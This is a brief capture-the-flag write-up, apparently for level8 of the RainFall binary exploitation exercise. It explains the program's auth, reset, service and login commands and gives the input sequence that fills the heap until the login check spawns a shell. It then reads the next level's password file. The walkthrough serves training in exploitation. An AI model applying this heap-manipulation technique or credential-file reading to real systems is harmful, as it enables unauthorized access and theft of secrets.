@@ -1,0 +1,29 @@
+scp -P 4242 level8@RainFall:level8 <local_path>
+
+----------------------------------------------------------------------------------
+
+We can see on the main (srcs files in this directory) that there is an infinite loop.
+
+The program has 2 global pointers: auth = 0x8049aac et service = 0x8049ab0
+
+It accepts 4 commands in a loop:
+	auth <string>		CALLS malloc(4), THEN strcpy(auth, <string>)
+	reset				CALLS free(auth)
+	service <string>	CALLS service = strdup(<string>)
+	login				CHECKS IF *(auth + 0x20) != 0, IF SO IT RUNS system("/bin/sh")
+
+----------------------------------------------------------------------------------
+
+So we tested the following:
+
+./level8
+
+'auth '
+
+service
+
+42nice
+
+login
+
+$ cat /home/user/level9/.pass
